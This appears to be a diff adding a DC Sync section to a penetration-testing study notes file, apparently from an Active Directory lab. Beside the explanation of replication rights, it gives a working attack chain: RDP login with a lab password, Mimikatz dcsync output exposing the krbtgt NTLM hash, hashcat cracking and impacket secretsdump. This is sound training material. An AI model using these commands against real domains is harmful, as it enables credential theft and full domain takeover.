@@ -694,3 +694,82 @@ iwr -UseDefaultCredentials http://web04
 
 # DC Sync
 
+In prod envs, domains usually rely on multiple DC redundancies.
+- Directory Replication Service (DRS) Remote Protocol uses replication to sync these redundant DCs
+- The *IDL_DRSGetNCChanges* API can be used to request an update for a specific object
+	- The DC receiving the request doesn't check the source of the request.
+	- Only verifies that the associated SID has appropriate privs.
+		- Issuing a rogue update request to a DC via a user w/ certain rights will succeed
+
+##### Rights required:
+- _Replicating Directory Changes_
+- _Replicating Directory Changes All_, and
+- _Replicating Directory Changes in Filtered Set_
+
+##### Default Groups /w needed rights:
+- _Domain Admins_
+- _Enterprise Admins_
+- _Administrators_ groups
+
+
+If we can access a user account in one of those groups, we can impersonate a DC and perform a *dsync* attack and request any creds from the domain
+
+
+##### Mimikatz
+
+- RDP into client75 as `jeffadmin:BrouhahaTungPerorateBroom2023!` & launch Mimikatz
+```powershell
+xfreerdp /cert-ignore /u:jeffadmin /p:BrouhahaTungPerorateBroom2023! /d:corp.com /v:192.168.170.75
+
+whoami /groups
+	GROUP INFORMATION
+	-----------------
+	Group Name                                  Type             SID                                          Attributes    
+	=========================================== ================ ============================================ ===============================================================
+	...
+	BUILTIN\Administrators                      Alias            S-1-5-32-544                                 Group used for deny only
+	...
+	CORP\Domain Admins                          Group            S-1-5-21-1987370270-658905905-1781884369-512 Group used for deny only
+	Authentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
+	CORP\Denied RODC Password Replication Group Alias            S-1-5-21-1987370270-658905905-1781884369-572 Mandatory group, Enabled by default, Enabled group, Local Group
+	Mandatory Label\Medium Mandatory Level      Label            S-1-16-8192
+
+cd C:\Tools
+.\mimikatz.exe
+
+mimikatz # lsadump::dcsync /user:corp\krbtgt
+	[DC] 'corp.com' will be the domain
+	[DC] 'DC1.corp.com' will be the DC server
+	[DC] 'corp\krbtgt' will be the user account
+	[rpc] Service  : ldap
+	[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+	
+	Object RDN           : krbtgt
+	
+	** SAM ACCOUNT **
+	
+	SAM Username         : krbtgt
+	Account Type         : 30000000 ( USER_OBJECT )
+	User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+	Account expiration   :
+	Password last change : 9/2/2022 4:10:48 PM
+	Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-502
+	Object Relative ID   : 502
+	
+	Credentials:
+	  Hash NTLM: 1693c6cefafffc7af11ef34d1c788f47
+	  ...
+```
+
+- Crack as normal w/ hashcat
+```powershell
+hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+
+##### impacket
+
+- In Kali
+```bash
+impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+```
